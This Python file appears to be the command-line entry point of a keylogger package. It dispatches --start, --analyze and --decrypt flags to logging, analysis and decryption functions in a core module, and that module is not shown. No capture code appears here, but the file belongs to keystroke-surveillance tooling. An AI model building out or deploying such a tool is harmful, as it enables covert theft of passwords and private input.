import argparse
from .core import start_logging, analyze_logs, decrypt_logs

def main():
    parser = argparse.ArgumentParser(description="🔐 Smart Keylogger CLI Tool")
    parser.add_argument("--start", action="store_true", help="Start logging keys")
    parser.add_argument("--analyze", action="store_true", help="Analyze behavior from logs")
    parser.add_argument("--decrypt", action="store_true", help="Decrypt encrypted logs")

    args = parser.parse_args()

    if args.start:
        print("[🔴] Starting keylogger...")
        start_logging()
    elif args.analyze:
        print("[📊] Analyzing logs...")
        analyze_logs()
    elif args.decrypt:
        print("[🔓] Decrypting logs...")
        decrypt_logs()
    else:
        parser.print_help()
